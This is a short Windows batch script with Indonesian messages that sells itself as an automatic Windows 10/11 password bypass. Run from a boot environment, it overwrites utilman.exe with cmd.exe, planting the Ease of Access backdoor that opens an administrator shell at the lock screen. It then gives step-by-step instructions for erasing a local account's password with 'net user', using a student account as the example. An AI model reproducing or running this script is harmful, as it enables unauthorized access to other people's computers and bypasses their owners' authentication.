@echo off
title Script Otomatis Bobol Password Windows (Ukuran 1 KB)
color 1F

echo ========================================================
echo    SCRIPT OTOMATIS BYPASS PASSWORD WINDOWS 10 / 11
echo ========================================================
echo.

:: Cari drive mana yang berisi folder Windows (bisa C: atau D: di WinPE)
set WINDRV=
if exist C:\Windows\System32\utilman.exe set WINDRV=C:
if exist D:\Windows\System32\utilman.exe set WINDRV=D:
if exist E:\Windows\System32\utilman.exe set WINDRV=E:

if "%WINDRV%"=="" (
    echo [ERROR] Partisi Windows tidak ditemukan!
    echo Pastikan laptop ini memiliki sistem operasi Windows.
    pause
    exit /b
)

echo [1/2] Menemukan partisi Windows di drive %WINDRV%...
echo [2/2] Memasang pintu darurat via tombol Kemudahan Akses (Utilman)...

:: Backup file asli jika belum pernah di-backup
if not exist %WINDRV%\Windows\System32\utilman.bak (
    copy %WINDRV%\Windows\System32\utilman.exe %WINDRV%\Windows\System32\utilman.bak >nul 2>&1
)

:: Ganti utilman dengan cmd
copy /y %WINDRV%\Windows\System32\cmd.exe %WINDRV%\Windows\System32\utilman.exe >nul 2>&1

echo.
echo ========================================================
echo            PEMASANGAN PINTU MASUK BERHASIL!
echo ========================================================
echo.
echo LANGKAH SELANJUTNYA:
echo 1. Cabut Flashdisk Anda.
echo 2. Tutup jendela ini dan restart laptop ke Windows normal.
echo 3. Di layar kunci (tempat minta password), KLIK IKON
echo    "Ease of Access / Kemudahan Akses" di pojok kanan bawah
echo    (ikon jam / orang melingkar di samping tombol power).
echo 4. Jendela CMD hitam Administrator akan langsung muncul!
echo 5. Ketik perintah ini untuk menghapus password:
echo       net user
echo       net user [NamaUser] ""
echo    (Contoh: net user Siswa "") lalu tekan Enter.
echo 6. Password langsung HILANG dan Anda bisa langsung masuk!
echo.
pause
